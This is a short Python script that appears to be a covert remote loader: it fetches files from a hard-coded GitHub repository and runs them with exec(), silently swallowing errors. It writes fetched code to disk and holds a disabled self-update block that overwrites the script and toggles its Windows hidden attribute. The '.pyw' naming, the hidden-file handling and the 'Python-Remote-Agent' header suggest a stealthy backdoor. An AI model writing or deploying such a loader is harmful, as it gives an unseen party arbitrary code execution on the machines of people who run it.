from urllib.request import *
from time import *
import os

ver = 0

script = os.path.abspath(__file__)
dir = os.path.dirname(script)

user = 'yarnayGH'
repo = 'bichoDataBase'
branch = 'main'
xScript = '1bach_c.py'

def check(file, branch=branch):
    try:
        return urlopen(
            Request(
                (f'https://raw.githubusercontent.com/{user}/{repo}/{branch}/{file}'),
                headers={'User-Agent': 'Python-Remote-Agent'}
            ),
            timeout=15
        ).read().decode('utf-8')
    except:
        return ''
if False:
#if check('ver')!=ver and check('ver')!='':
    os.system(f'attrib -h "{script}"')
    open(
        script, 'w'
    ).write(
        check('bicho.pyw')
    )
    os.system(f'attrib +h "{script}"')

open(dir+'/aver.txt', 'w').write(check('1bach_c.py'))

try:
    exec(check('general.py'))
except:
    pass

try:
    exec(check(xScript))
except:
    pass
